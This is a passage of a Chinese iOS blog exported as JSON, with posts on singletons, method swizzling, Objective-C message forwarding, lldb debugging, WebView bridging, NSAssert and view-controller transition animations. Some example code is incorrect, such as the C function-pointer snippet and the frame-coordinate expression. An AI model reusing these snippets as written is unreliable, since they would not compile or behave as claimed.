completion(YES,response.code,@&quot;注册成功&quot;); &#125; else &#123; completion(NO,response.code,response.message); &#125; &#125;]; &#125; #pragma mark - CheckPool //检查池 - (NSString *)checkAccount &#123; if ([_account isEqualToString:@&quot;&quot;]) &#123; return @&quot;请输入手机号&quot;; &#125; return CheckPassed; &#125;//检查账号 - (NSString *)checkVerifyCode &#123; return CheckPassed; &#125; - (NSString *)checkLoginPassword &#123; return CheckPassed; &#125; - (NSString *)checkPayPassword &#123; return CheckPassed; &#125; - (NSString *)checkSecQuestion &#123; return CheckPassed; &#125; - (NSString *)checkSecAnswer &#123; return CheckPassed; &#125; - (NSString *)checkIDCardNo &#123; return CheckPassed; &#125; - (NSString *)checkLoginWithPassword &#123; NSString *checkResult; checkResult = [self checkAccount]; if (![checkResult isEqualToString:CheckPassed]) &#123; return checkResult; &#125; checkResult = [self checkLoginPassword]; if (![checkResult isEqualToString:CheckPassed]) &#123; return checkResult; &#125; return CheckPassed; &#125; - (NSString *)checkRegisterOpenAccount &#123; NSString *checkResult; checkResult = [self checkAccount]; if (![checkResult isEqualToString:CheckPassed]) &#123; return checkResult; &#125; checkResult = [self checkLoginPassword]; if (![checkResult isEqualToString:CheckPassed]) &#123; return checkResult; &#125; checkResult = [self checkPayPassword]; if (![checkResult isEqualToString:CheckPassed]) &#123; return checkResult; &#125; checkResult = [self checkSecQuestion]; if (![checkResult isEqualToString:CheckPassed]) &#123; return checkResult; &#125; checkResult = [self checkSecAnswer]; if (![checkResult isEqualToString:CheckPassed]) &#123; return checkResult; &#125; checkResult = [self checkIDCardNo]; if (![checkResult isEqualToString:CheckPassed]) &#123; return checkResult; &#125; return CheckPassed; &#125; @end 设计隐患通常来讲单例都是伴随着整个App的生命周期,不推荐释放的,因为会造成数据的不安全,所以使用这个模式存在一种隐患,虽然在举例的代码中并没有发生. 假设存在一种异步情况用来获取某个账户的密保问题 NSString *question = @&quot;&quot;; dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^&#123; //某个函数通过单例函数获取密保问题 question = [self getSecurityQuestionByAccount:[ModuleSingleton shareInstance].account];//第一个Module dispatch_async(dispatch_get_main_queue(), ^&#123; //然后放回单例 [[ModuleSingleton shareInstance] setSecQuestion:question];//被释放后重新生成的Module &#125;); &#125;); 如果在执行dispatch_async(dispatch_get_main_queue(), ^{})之前,ModuleSingleton被释放了,那么函数内部的setSecQuestion将会把question赋给一个全新的ModuleSingleton,而不是第一个ModuleSingleton. 也就是说不恰当的使用,会造成数据的混乱,这个问题是文章单例模式的滥用让我发现的.","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Architecture","slug":"Architecture","permalink":"http://yoursite.com/tags/Architecture/"},{"name":"Singleton","slug":"Singleton","permalink":"http://yoursite.com/tags/Singleton/"}]},{"title":"GitHub上PullRequest有冲突怎么办","date":"2016-01-31T15:00:00.000Z","path":"2016/02/01/GitHub上PullRequest有冲突怎么办/","text":"GitHub上的Conflict的产生一般Conflict的产生,都是几个人同时在改一个仓库的代码,特别是Fork来的,没有进行同步导致的 Google的关键词可以Google Github Update Forked来查找 如何同步Forked命令行是肯定可以的,但是一般大家都喜欢用Desktop嘛 先到DeskTop的Reporsitory的 Repository Settings里 更改Primary Remote Repository的地址为Forked来的地址 然后进行Sync,此时会提示有冲突 然后到Uncommitted Changes里看哪些文件冲突了 改Primary Remote Repository为自己Fork的仓库地址 然后用Editer(比如Xcode)改掉Conflict,想留哪里的把,另一部分删掉就可以了 然后去查看自己Pull Request就没有冲突了","tags":[{"name":"Git","slug":"Git","permalink":"http://yoursite.com/tags/Git/"}]},{"title":"MethodSwizzling方法hook函数","date":"2016-01-31T15:00:00.000Z","path":"2016/02/01/MethodSwizzling方法hook函数/","text":"MethodSwizzling是什么由于OC是一种动态语言,基于消息机制的函数.执行代码的时候,函数并不是在编译阶段就确定了的,是动态绑定的,他们的绑定关系是通过一张映射表来确定的. 与动态绑定对应的是C的静态绑定,会在后文举例说明. 那么既然函数是动态绑定的,我们能不能通过一些方法动态改变这些绑定关系,答案就是MethodSwizzling.它属于C语言,利用的是Runtime机制. MethodSwizzling怎么用动态改变这个映射基本分为3个,交换,修改,设置新方法 利用 method_exchangeImplementations 来交换2个方法的实现 利用 class_replaceMethod 来修改类的实现 利用 method_setImplementation 来直接设置某个方法实现 我们以常见的交换举例,先准备两个函数 - (void)oringinalLog &#123; NSLog(@&quot;Oringinal Method&quot;); &#125; - (void)swizzlingLog &#123; NSLog(@&quot;Swizzling Method&quot;); &#125; 函数前后的映射关系如下图 然后我们进行测试 - (void)touchUpInsideButton &#123; NSLog(@&quot;First Log:&quot;); [self oringinalLog]; [self swizzlingLog]; //Method Swizzling Test Method oringinal = class_getInstanceMethod([self class], @selector(oringinalLog)); Method swizzling = class_getInstanceMethod([self class], @selector(swizzlingLog)); method_exchangeImplementations(oringinal, swizzling); NSLog(@&quot;Second Log:&quot;); [self oringinalLog]; [self swizzlingLog]; &#125; 观察输出日志 2016-02-02 10:49:09.664 Learn[1098:619493] First Log: 2016-02-02 10:49:09.665 Learn[1098:619493] Oringinal Method 2016-02-02 10:49:09.665 Learn[1098:619493] Swizzling Method 2016-02-02 10:49:09.665 Learn[1098:619493] Second Log: 2016-02-02 10:49:09.666 Learn[1098:619493] Swizzling Method//替换完成 2016-02-02 10:49:09.666 Learn[1098:619493] Oringinal Method 可以发现第二次打印方法已经被互换,而且一旦执行过Exchange方法后,映射表是一直被交换的,和函数作用域无关,使用另外一个按键测试 - (void)touchUpInsideOtherButton &#123; NSLog(@&quot;OtherButton Log:&quot;); [self oringinalLog]; [self swizzlingLog]; &#125; 观察日志,可以发现开始没有被替换,后来被替换了 2016-02-02 10:58:11.551 Learn[1149:728289] OtherButton Log: 2016-02-02 10:58:11.551 Learn[1149:728289] Oringinal Method//第一次按没有被替换 2016-02-02 10:58:11.552 Learn[1149:728289] Swizzling Method 2016-02-02 10:58:13.315 Learn[1149:728289] First Log: 2016-02-02 10:58:13.315 Learn[1149:728289] Oringinal Method 2016-02-02 10:58:13.315 Learn[1149:728289] Swizzling Method 2016-02-02 10:58:13.316 Learn[1149:728289] Second Log: 2016-02-02 10:58:13.316 Learn[1149:728289] Swizzling Method 2016-02-02 10:58:13.317 Learn[1149:728289] Oringinal Method//此时Exchange结束 2016-02-02 10:58:14.584 Learn[1149:728289] OtherButton Log: 2016-02-02 10:58:14.584 Learn[1149:728289] Swizzling Method//再次点击,已经被替换 2016-02-02 10:58:14.584 Learn[1149:728289] Oringinal Method 用MethodSwizzling来Hook的递归假象像刚刚上文那种已经实现了的两个方法,互相交换来使用,很少会遇到这种需求,多数需求还是用自己的函数替代系统的函数,完成一些功能性的插入. 比如我想让每次调用NSString的lowercaseString都把小写化的字符输出一下.由于这个函数是系统的,我们无法进入函数内部修改. @interface NSString (HookCategory) - (NSString *)hooked_lowcaseString; @end @implementation NSString (HookCategory) - (NSString *)hooked_lowcaseString &#123; NSString *lowercase = [self hooked_lowcaseString]; NSLog(@&quot;%@&quot;,lowercase); return lowercase; &#125; @end 上文一眼看上去,在hooked_lowcaseString内部调用了hooked_lowcaseString岂不是产生了递归.但是由于是要配合Exchange使用的,并不会产生 我们来看测试代码 NSString *tempStr = @&quot;ABC&quot;; Method oringinal = class_getInstanceMethod([NSString class], @selector(lowercaseString)); Method swizzling = class_getInstanceMethod([NSString class], @selector(hooked_lowcaseString)); method_exchangeImplementations(oringinal, swizzling); tempStr = [tempStr lowercaseString];//此处已经调用的是hooked_lowcaseString 进入hooked_lowcaseString函数内部 - (NSString *)hooked_lowcaseString &#123; //此处调用的是系统lowercaseString,所以不会递归 NSString *lowercase = [self hooked_lowcaseString]; NSLog(@&quot;%@&quot;,lowercase); return lowercase; &#125; 什么是动态绑定所谓动态绑定就是和静态绑定对应的,因为OC是C的超集,所以这里通过C来解释,首先定义两个函数. #import &lt;stdio.h&gt; void printHello() &#123; printf(&quot;Hello\\n&quot;); &#125; void printGoodbye()&#123; printf(&quot;Goodbye\\n&quot;); &#125; 这种就是静态绑定,编译器编译结束就知道这里回执行printHello和printGoodbye函数,所以直接把指针指向了这两个函数的所在地 void doTheThing(int type) &#123; if(type == 0) &#123; printHello(); &#125;else &#123; printGoodbye(); &#125; return 0; &#125; 这种就是动态绑定,编译器只是指导这里会声明一个func函数,func函数具体干什么,要等到运行时根据type的值,来让func指向Hello和Goodbye其中一个,所以我们只需要控制type值,就让func有了多种可能性 void doTheThing(int type) &#123; void (*func)(); if(type == 0) &#123; func = printHello(); &#125;else &#123; func = printGoodbye(); &#125; func(); return 0; &#125; OC的动态函数机制消息调用成功的情况由于OC是动态绑定机制,所以每个**[类活实例 函数名]**的调用,都是将某个字符串(函数名的Selector)发送到某个地址(可以是类名,也可以是某个实例的内存地址).所以才会有类方法(classMethod)和实例方法(InstanceMethod). 那么对这个字符串(函数名),OC会做哪些处理呢?首先会调用底层的C函数 void objc_msgSend(id self, SEL cmd, ...) 这个函数是个多参数函数,第一个是你传来的地址,第二个就是消息的selector,后边可以附加参数,对于一些特殊情况还有 objc_msgSend_stret 发送的消息返回一个结构体 objc_msgSend_fpret 发送的消息返回一个浮点数Float objc_msgSendSuper 发送消息给超类就是[super message:parameter] 这是可以正常发送的函数状态,如果遍历了所有的super还没有找对应这个消息的函数,就会抛出异常 这个是由NSObject的**doesNotRecognizeSelector:**抛出的异常 消息调用不成功消息调用不成功会有三个函数来尝试补救这个问题,三个消息的策略分别是 卧槽,这个没见过啊,我看看能不能自己处理掉 fuck处理不掉啊,算了交给备胎看他行不行 备胎说,尼玛,我也搞不定啊,丢回系统找别人吧 动态方法解析 //二选一,尝试在内部捕获这个函数并进行一定的处理 + (BOOL)resolveInstanceMethod:(SEL)selector; + (BOOL)resolveClassMethod:(SEL)selector; 备援接收者 //把这个消息的接收者发送给另外一个对象 //这个对象不是super的一员,因为此时已经遍历了super找不到对应 - (id)forwardingTargetForSelector:(SEL)selector; 完整消息转发 //这里把SEL的target,message的selector字符串本身,parameters重新包装成一个NSInvocation //然后把这个NSInvocation交还给系统重新进行一次派发(msssage-dispatch system) - (void)forwardInvocation:(NSInvocation *)invocation; 所以在自定义的Class里的时候,我们可以通过重构这三个函数,来编写对应未知消息的处理方式. 参考文献[1]http://blog.csdn.net/yiyaaixuexi/article/details/9374411 [2]Effective Objective-C 2.0","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"C","slug":"C","permalink":"http://yoursite.com/tags/C/"},{"name":"Reflect","slug":"Reflect","permalink":"http://yoursite.com/tags/Reflect/"}]},{"title":"如何主动闪退让别人用自己的接口函数","date":"2016-01-31T15:00:00.000Z","path":"2016/02/01/如何主动闪退让别人用自己的接口函数/","text":"为什么要主动闪退比如自己写了一个Class,然后开放了一个**initWithTitle:**的接口,但是总有像我一样的挫B不看头文件就开始写程序,程序运行起来不正常查半天还不知道为啥,所以干脆主动闪退告诉别人 小子! 用我写的类 如何主动闪退@throw [NSException exceptionWithName:NSInternalInconsistencyException reason:@&quot;提示信息&quot; userInfo:nil]; 通过丢出一个异常,来让App闪退,第一个参数Name,是一些系统定义的常量字符串 /*************** Generic Exception names ***************/ FOUNDATION_EXPORT NSString * const NSGenericException; FOUNDATION_EXPORT NSString * const NSRangeException; FOUNDATION_EXPORT NSString * const NSInvalidArgumentException; FOUNDATION_EXPORT NSString * const NSInternalInconsistencyException; FOUNDATION_EXPORT NSString * const NSMallocException; FOUNDATION_EXPORT NSString * const NSObjectInaccessibleException; FOUNDATION_EXPORT NSString * const NSObjectNotAvailableException; FOUNDATION_EXPORT NSString * const NSDestinationInvalidException; FOUNDATION_EXPORT NSString * const NSPortTimeoutException; FOUNDATION_EXPORT NSString * const NSInvalidSendPortException; FOUNDATION_EXPORT NSString * const NSInvalidReceivePortException; FOUNDATION_EXPORT NSString * const NSPortSendException; FOUNDATION_EXPORT NSString * const NSPortReceiveException; FOUNDATION_EXPORT NSString * const NSOldStyleException; 如何配合使用可以重写最终初始化方法**initWithFrame:和initWithCoder:**来进行条件检查,不满足就闪退!","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"}]},{"title":"控制台调试(lldb)快速入门","date":"2016-01-28T15:00:00.000Z","path":"2016/01/29/控制台调试(lldb)快速入门/","text":"控制台调试干嘛用除了用Xcode控制断点\\打印变量之外,控制台调试最大的作用就是可以注入代码 基本操作在断点暂停的状态下,控制台内可以输入 n (next下一步) s (step进入函数) c (continue继续执行) p (print打印某个指针) po (print object打印某个指针指向的内容) 例如 po self.view 注入代码控制变量值控制台调试最重要的就是注入代码 e (expression执行函数) 例如 BOOL value = YES; //break point if (value) &#123; NSLog(@&quot;%tu&quot;,value); &#125; 比如在上述代码中,value如果正常运行,始终为YES,我们可以通过注入代码让其改变 (lldb) po value YES (lldb) e value = NO (BOOL) $4 = NO (lldb) po value NO 可以动态改变某个值,从而帮助调试 注入代码控制UI我们还可以通过注入代码指向某个内存,或者变量,执行一些函数,如先改变背景色,然后通过**[CATransaction flush]**刷新就可以看到效果. 记住声明变量的时候带”$”号,以及执行函数时的返回值(void)等 (lldb) e id $myView = self.view (lldb) po $myView &lt;UIView: 0x7faecae7dfe0; frame = (0 267; 375 400); autoresize = W+H; layer = &lt;CALayer: 0x7faec95bf200&gt;&gt; (lldb) po self.view &lt;UIView: 0x7faecae7dfe0; frame = (0 267; 375 400); autoresize = W+H; layer = &lt;CALayer: 0x7faec95bf200&gt;&gt; (lldb) e id $youView = (id)0x7faecae7dfe0 (lldb) po $youView &lt;UIView: 0x7faecae7dfe0; frame = (0 267; 375 400); autoresize = W+H; layer = &lt;CALayer: 0x7faec95bf200&gt;&gt; (lldb) e (void)[$myView setBackgroundColor:[UIColor blueColor]] (lldb) e (void)[CATransaction flush] 控制当前函数返回值控制台还可以通过指令控制返回值,即使进入了汇编的界面也可以,比如有一些.a静态库的函数,Step进入函数后,直接是汇编界面,此时可以直接控制返回 (lldb) thread return NO 更多的可以查看参考文献 参考文献[1]http://objccn.io/issue-19-2/","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"}]},{"title":"HTML5和Native应用交互的基本原理","date":"2016-01-27T15:00:00.000Z","path":"2016/01/28/HTML5和Native应用交互的基本原理/","text":"HTML5应用和Native交互的桥梁HTML5应用本身就是个网页,以一个index.html为入口.那么和Native引用交互的较量就是WebView WebView交互方法Native对H5进行交互,通过函数发送JS代码 [WebView stringByEvaluatingJavaScriptFromString:@&quot;control.setSequencePlay()&quot;]; H5对Native进行交互,通过发送Request,并且Request被WebView的协议接收Request字符串 - (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType; 交互的基本原理交互的过程,Native生成一段JS代码,然后执行,H5则通过和Native的开发人员约定一套规则(协议?),通过Request请求发送,发送的过程中,被桥梁WebViewDelegate拦截下来.然后分析字符串,执行本地的函数","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"}]},{"title":"OC中的偏门语句TryCatchAssert","date":"2016-01-27T15:00:00.000Z","path":"2016/01/28/OC中的偏门语句TryCatchAssert/","text":"Try…Catch…为什么OC中很少用Try Catch,根据知乎热心网友回答 因为try catch无法捕获UncaughtException 而oc中大部分crash如：内存溢出、野指针等都是无法捕获的 而能捕获的只是像数组越界之类（这真心需要catch么？），所以try catch对于oc来说，比较鸡肋。 AssertOC中的NSAssert()是一个宏,用于开发阶段调试程序中的Bug,如果发布不去掉的话,有可能会影响到程序的性能。 #define NSAssert(condition, desc) condition是条件表达式，值为YES或NO；desc为异常描述，通常为NSString。 当conditon为YES时程序继续运行，为NO时，则抛出带有desc描述的异常信息。NSAssert()可以出现在程序的任何一个位置 如何一键除去NSAssert在Build Settings菜单，找到Preprocessor Macros项，Preprocessor Macros项下面有一个选择，用于程序生成配置：Debug版和Release版。选择 Release项，设置NS_BLOCK_ASSERTIONS，不进行断言检查。 然后只需要在Run的时候选择为Release,就不会进行断言.对于Archive 而言，默认的生成配置就是Release。 [1]https://www.zhihu.com/question/21248079/answer/27037365[2]http://blog.csdn.net/univcore/article/details/16859263","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"C","slug":"C","permalink":"http://yoursite.com/tags/C/"}]},{"title":"Xcode插件与装逼利器","date":"2016-01-27T15:00:00.000Z","path":"2016/01/28/Xcode插件与装逼利器/","text":"Xcode插件管理器一直都是Github上手动搜插件,最近看了唐巧的书,唐老师不愧老司机,收获很大,其中有个Xcode插件管理器十分好用 Alcatraz 装逼利器除了常用的插件之外,我还特别中意两个装逼利器,其中一个自己还Commit了一些代码,但是人家还没接受,心里凉凉哒 火花特效 Miku跳舞 Miku跳舞加入播放控制和音乐源控制,如果人家没接受,可以去我的Git下我Fork的 Miku跳舞自己改写这个插件还学了挺多,比如JS比如HTML5,比如Xcode插件开发","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"}]},{"title":"Xcode插件开发时如何打断点","date":"2016-01-27T15:00:00.000Z","path":"2016/01/28/Xcode插件开发时如何打断点/","text":"Xcode插件开发打断点好多人说Xcode插件开发不能打断点,因为一旦Run了就安装了,其实是错误的. 可以通过设置 选择Xcode为可执行文件 Edit Scheme-Run-Info-Executable-Other-Xcode.app 关闭当前界面调试 取消 Edit Scheme-Run-Options-Enable user interface debugging 此时就可以正常打断点了","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"}]},{"title":"快度获取某个Frame的下角座标","date":"2016-01-27T15:00:00.000Z","path":"2016/01/28/快度获取某个Frame的下角座标/","text":"控件中获得下座标写代码经常要获取到某个控件的下角Y的座标,经常大家是 CGFloat y = view.frame.bounds.origin.y + view.frame.size.height; 其实在Core Graphics里有一些C函数,比如以下 CG_EXTERN CGFloat CGRectGetMaxY(CGRect rect) 用起来也十分方便","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Frame","slug":"Frame","permalink":"http://yoursite.com/tags/Frame/"}]},{"title":"UIViewController的转场动画研究","date":"2016-01-26T15:00:00.000Z","path":"2016/01/27/UIViewController的转场动画研究/","text":"UIViewController转场的原理UIViewController是利用UIViewControllerAnimatedTransitioning协议把两个ViewController的View放在一个容器Container里进行UIView动画 补充: 把UIView放入一个容器是通过UIViewControllerContextTransitioning获取到画布数据达到的 所谓画布数据就是元数据 UIViewController转场用到的协议转场动画实现需要用到2个协议 UIViewControllerAnimatedTransitioning(需要自己实现) UIViewControllerContextTransitioning(仅需要使用) 转场动画调用需要1个协议,三选一 UIViewControllerTransitioningDelegate(present出VC用) UINavigationControllerDelegate(push出VC用) UITabBarControllerDelegate(switch切换VC用) 出现VC的方法根据VC出现的方法不同,需要选用不同的代理(3选1)来调用动画,常见的VC切换方法无非就是Present,NavigationPush,TabBarSwitch三种方式.三种方式的代理中,都通过返回一个遵循了UIViewControllerAnimatedTransitioning协议的指针来调用动画. 我们暂且称遵循了UIViewControllerAnimatedTransitioning协议的Object为动画控制器(AnimationController). Present出窗口@interface ViewController () &lt;UIViewControllerTransitioningDelegate&gt; @end - (void)presentViewController &#123; ViewController *next = [[ViewController alloc]init]; next.transitioningDelegate = self; [self presentViewController:next animated:YES completion:nil]; &#125; - (id&lt;UIViewControllerAnimatedTransitioning&gt;)animationControllerForPresentedController:(UIViewController *)presented presentingController:(UIViewController *)presenting sourceController:(UIViewController *)source &#123; return AnimationController; &#125; Navigation中Push窗口@interface ViewController () &lt;UINavigationControllerDelegate&gt; @end - (void)pushViewController &#123; self.navigationController.delegate = self; ViewController *next = [[ViewController alloc]init]; [self.navigationController pushViewController:next animated:YES]; &#125; - (id&lt;UIViewControllerAnimatedTransitioning&gt;)navigationController:(UINavigationController *)navigationController animationControllerForOperation:(UINavigationControllerOperation)operation fromViewController:(UIViewController *)fromVC toViewController:(UIViewController *)toVC &#123; return AnimationController; &#125; Tabbar中Switch窗口@interface ViewController () &lt;UITabBarControllerDelegate&gt; @end - (void)switchViewController &#123; self.tabBarController.delegate = self; &#125; - (id&lt;UIViewControllerAnimatedTransitioning&gt;)tabBarController:(UITabBarController *)tabBarController animationControllerForTransitionFromViewController:(UIViewController *)fromVC toViewController:(UIViewController *)toVC &#123; return AnimationController; &#125; AnimationController是什么AnimationController是任何一个实现了UIViewControllerAnimatedTransitioning代理方法的类 可以充当AnimationController的候选: 独立的AnimationController的Object(!!推荐这个方法) 某个ViewController本身 在一个NavigationController的栈中Navgation自己本身 TabBar中TabBar本身 一般都使用第一种,2/3/4仅做讨论研究 独立的AnimationController类为了防止出现各种意外情况,大多数都使用新建一个继承于NSObject的Class,然后用它来完成AnimationController // AnimationController.h #import &lt;Foundation/Foundation.h&gt; #import &lt;UIKit/UIKit.h&gt; @interface AnimationController : NSObject &lt;UIViewControllerAnimatedTransitioning&gt; @end // AnimationController.m #import &quot;AnimationController.h&quot; @implementation AnimationController - (NSTimeInterval)transitionDuration:(id&lt;UIViewControllerContextTransitioning&gt;)transitionContext &#123; return 2.0f;//动画时间 &#125; - (void)animateTransition:(id&lt;UIViewControllerContextTransitioning&gt;)transitionContext &#123; //动画效果 ....... &#125; @end 此时加载头文件,然后返回一个实例化的对象即可 - (id&lt;UIViewControllerAnimatedTransitioning&gt;)animationControllerForPresentedController:(UIViewController *)presented presentingController:(UIViewController *)presenting sourceController:(UIViewController *)source &#123; return [[AnimationController alloc]init]; &#125; 关于AnimationController更多的讨论可以看文章末尾的[谁可以当AnimationController](## 扩展研究) 动画效果的控制ControllerContext在完成AnimationController的构造之后,动画效果的具体实现是通过函数 - (void)animateTransition:(id&lt;UIViewControllerContextTransitioning&gt;)transitionContext; 完成的. 这里我们回顾开篇的话UIViewController是利用UIViewControllerAnimatedTransitioning协议把两个ViewController的View放在一个容器Container里进行UIView动画,具体怎么实现呢?可以看到函数的入参类型是一个遵循UIViewControllerContextTransitioning协议的Object,我们打开这个协议的头文件 UIKIT_EXTERN NSString *const UITransitionContextFromViewControllerKey NS_AVAILABLE_IOS(7_0); UIKIT_EXTERN NSString *const UITransitionContextToViewControllerKey NS_AVAILABLE_IOS(7_0); UIKIT_EXTERN NSString *const UITransitionContextFromViewKey NS_AVAILABLE_IOS(8_0); UIKIT_EXTERN NSString *const UITransitionContextToViewKey NS_AVAILABLE_IOS(8_0); 开头迎面而来的是4个Key,这4个Key是用来取转场中两个ViewController或者他们的View的,我们拿个简单的效果举例 - (void)animateTransition:(id&lt;UIViewControllerContextTransitioning&gt;)transitionContext &#123; //1. 通过viewControllerForKey函数和Key值得到toViewController UIViewController *toVC = [transitionContext viewControllerForKey:UITransitionContextToViewControllerKey]; //2. 通过finalFrameForViewController函数获得到动画结束后toViewController的Frame CGRect finalRect = [transitionContext finalFrameForViewController:toVC]; //3. 把toViewController的View加入到需要做动画的容器中,容器通过containerView函数获取 [[transitionContext containerView]addSubview:toVC.view]; //4. 动画开始的状态 toVC.view.frame = CGRectOffset(finalRect, 0, [[UIScreen mainScreen]bounds].size.height); //5. 使用UIView层面上的动画,让toViewController.view和fromViewController.view做动画 //这里基本就到本质了,实质上是通过Context画布(元数据),让还没有DidAppear的ViewController的View传递过来,然后做两个View层上的动画 [UIView animateWithDuration:[self transitionDuration:transitionContext] delay:0.0 usingSpringWithDamping:0.6 initialSpringVelocity:0.0 options:UIViewAnimationOptionCurveLinear animations:^&#123; //6. 动画结束的状态 toVC.view.frame = finalRect; &#125; completion:^(BOOL finished) &#123; //7. 重要!!这里一定要声明转场动画已经结束了!! [transitionContext completeTransition:YES]; &#125;]; &#125; 为什么要completeTransition因为在转场动画进行的过程中,为了防止动画终端,此时用的是画布Context生成的View,整个过程中,App是无法进行响应Respond的,所以如果不进行completeTransition的声明,整个程序就无法响应任何事件,动画结束就进入卡死状态了. 总结当我们需要转场时,需要先找到一个遵循了Present/Navigation/TabBar对应协议的转场动画协议进行实现,然后返回一个遵循了UIViewControllerAnimatedTransitioning的AnimationController,在AnimationController实现的协议中,使用UIViewControllerContextTransitioning协议对动画进行具体实现 扩展研究TabBar的另外一种转场动画TabBar除了使用AnimationController实现转场之外,还可以使用另外一种方式进行动画转场,看TabBarController的头文件中 NS_CLASS_AVAILABLE_IOS(2_0) @interface UITabBarController : UIViewController &lt;UITabBarDelegate, NSCoding&gt; @property(nonatomic,readonly) UITabBar *tabBar NS_AVAILABLE_IOS(3_0); 其本身是遵循UITabBarDelegate协议的,并且具有tabBar变量.那么我们可以实现UITabBarDelegate协议中的 - (void)tabBar:(UITabBar *)tabBar didSelectItem:(UITabBarItem *)item; // called when a new view is selected by the user (but not programatically) 这个函数,来拦截转换的过程并加入Layer层动画 - (void)tabBar:(UITabBar *)tabBar didSelectItem:(UITabBarItem *)item &#123; CATransition* animation = [CATransition animation]; [animation setDuration:0.5f]; [animation setType:kCATransitionFade]; [animation setSubtype:kCATransitionFromRight]; [animation setTimingFunction:[CAMediaTimingFunction functionWithName:kCAMediaTimingFunctionEaseOut]]; [[self.view layer]addAnimation:animation forKey:@&quot;switchView&quot;]; &#125; 在该函数和AnimationController动画同时存在时,会优先响应该函数,不执行AnimationController,所以在改动旧代码的时候需要检查一下,不然会造成新加入的动画无效. 谁可以当AnimationController(可略过)某个ViewController本身如果仅仅是在某个ViewController中Present出另一个,可以把其本身当作AnimationController. @interface ViewController () &lt;UIViewControllerTransitioningDelegate, UIViewControllerAnimatedTransitioning&gt; @end @implementation ViewController - (id&lt;UIViewControllerAnimatedTransitioning&gt;)animationControllerForPresentedController:(UIViewController *)presented presentingController:(UIViewController *)presenting sourceController:(UIViewController *)source &#123; return self; &#125; @end 使用Navigation本身在使用了Navigation的情况下,可以使用某一个栈中的ViewController作为AnimationController,但是不能使用Navigation本身. 这种情形下可以 @interface ViewController () &lt;UINavigationControllerDelegate, UIViewControllerAnimatedTransitioning&gt; @end @implementation ViewController - (id&lt;UIViewControllerAnimatedTransitioning&gt;)navigationController:(UINavigationController *)navigationController animationControllerForOperation:(UINavigationControllerOperation)operation fromViewController:(UIViewController *)fromVC toViewController:(UIViewController *)toVC &#123; return self; &#125; @end 这种情形下不行,原因可能是由于self.navigationController.delegate = self相当于NavigationController中self.delegate = self,原因不确定,总之会Crash //ViewController.h @interface ViewController () &lt;UINavigationControllerDelegate&gt; @end @implementation ViewController - (void)viewDidLoad &#123; [super viewDidLoad]; self.navigationController.delegate = self; &#125; - (id&lt;UIViewControllerAnimatedTransitioning&gt;)navigationController:(UINavigationController *)navigationController animationControllerForOperation:(UINavigationControllerOperation)operation fromViewController:(UIViewController *)fromVC toViewController:(UIViewController *)toVC &#123; return (NavViewController *)self.navigationController; &#125; @end //一个自定义的继承于UINavigationController的Navigation @interface NavViewController : UINavigationController&lt;UIViewControllerAnimatedTransitioning&gt; @end 使用TabBar本身与Navigation不同的是,如果才用TabBar本身作为AnimationController就不会Crash //ViewController.h @interface ViewController () &lt;UITabBarControllerDelegate&gt; @end @implementation ViewController - (void)viewDidLoad &#123; [super viewDidLoad]; self.tabBarController.delegate = self; &#125; - (id&lt;UIViewControllerAnimatedTransitioning&gt;)navigationController:(UINavigationController *)navigationController animationControllerForOperation:(UINavigationControllerOperation)operation fromViewController:(UIViewController *)fromVC toViewController:(UIViewController *)toVC &#123; return (TabViewController *)self.tabBarController; &#125; @end //一个自定义的继承于UITabBarController的TabBar @interface TabViewController : UITabBarController &lt;UIViewControllerAnimatedTransitioning&gt; @end 而且如果始终TabBar中某一个ViewController作为AnimationController自然也可以. @interface ViewController () &lt;UITabBarControllerDelegate, UIViewControllerAnimatedTransitioning&gt; @end @implementation ViewController - (id&lt;UIViewControllerAnimatedTransitioning&gt;)navigationController:(UINavigationController *)navigationController animationControllerForOperation:(UINavigationControllerOperation)operation fromViewController:(UIViewController *)fromVC toViewController:(UIViewController *)toVC &#123; return self; &#125; @end 参考文献[1]http://kittenyang.com/uiviewcontrollertransitioning/[2]http://objccn.io/issue-12-3/","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"ViewController","slug":"ViewController","permalink":"http://yoursite.com/tags/ViewController/"},{"name":"Animation","slug":"Animation","permalink":"http://yoursite.com/tags/Animation/"}]},{"title":"UIView和CoreAnimation的动画研究","date":"2016-01-25T15:00:00.000Z","path":"2016/01/26/UIView和CoreAnimation的动画研究/","text":"常见的动画实现方式先祭上一张大图,说明两种常见动画的层次关系 UIView层面上的动画 CoreAnimation的Layer层动画 UIView层的动画第一种就是常见的我们经常使用的UIView的闭包动画,记得使用这个动画,内部的两个控件要在同一个View上,不然会Crash. //UIView层面的自定义动画1 [UIView animateWithDuration:0.5 animations:^&#123; &#125;]; 第二种是提交动画,由两句话控制,类似C序言的过程语言 //UIView层面的系统动画2 [UIView beginAnimations:@&quot;animationID&quot; context:nil];//动画开始 //设置动画属性开始 [UIView setAnimationDuration:0.5f]; [UIView setAnimationCurve:UIViewAnimationCurveEaseInOut]; [UIView setAnimationTransition:UIViewAnimationTransitionFlipFromLeft forView:customView cache:YES]; 